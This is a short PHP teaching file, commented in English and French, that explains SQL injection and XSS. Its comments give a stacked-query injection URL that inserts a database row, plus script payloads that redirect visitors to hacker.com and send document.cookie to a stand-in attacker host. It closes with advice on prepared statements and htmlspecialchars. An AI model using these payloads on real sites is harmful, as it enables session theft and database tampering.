<?php


// movie.php?id=100

foreach ($rowset as $row) {
    echo $row['lastname'] . '<br>';
}

/*
  Imagine that you have a page that use the $_GET for
  request the database.

  But since no verification
  is done on it, the user can
  serve to divert the request.

  A malicious user could
  exploit this vulnerability by accessing
  to the url this way:
 */

// vulnerable_page.php?id=2;insert into clients(firstname, lastname)values('new_val', "max");--

/*
  Imaginons maintenant que j'arrive à
  accéder à un site vulnérable aux injections SQL :

  Je pourrai parfois inscrire en base de données
  ce que je veux :
 */

/*

    We can exploit the security failures in a multitude ways:

    - Redirect all visitors to another site:
            <script language="javascript">document.location="http://hacker.com/"</script>

    - Display a desired content by the hacker (message, ads ...):
            <script>document.write('PUBLICITE')</script>

    By far the most interesting:
    - Stealing information from visitors (cookies, sessions ...):
      <script>window.open('http://hacker.com/recupcookie.php?val='+document.cookie);</script>
 */

/*
    To protect yourself from XSS vulnerabilities:

    The htmlspecialchars () function allows you to transform
    special characters in HTML entities.
    They will no longer be interpreted as tags
    by the browser, but will be rendered as text.

    In Summary: Prepared Requests to Protect the Database, Escape HTML Characters When Displaying HTML to 
    avoid XSS Injections
 */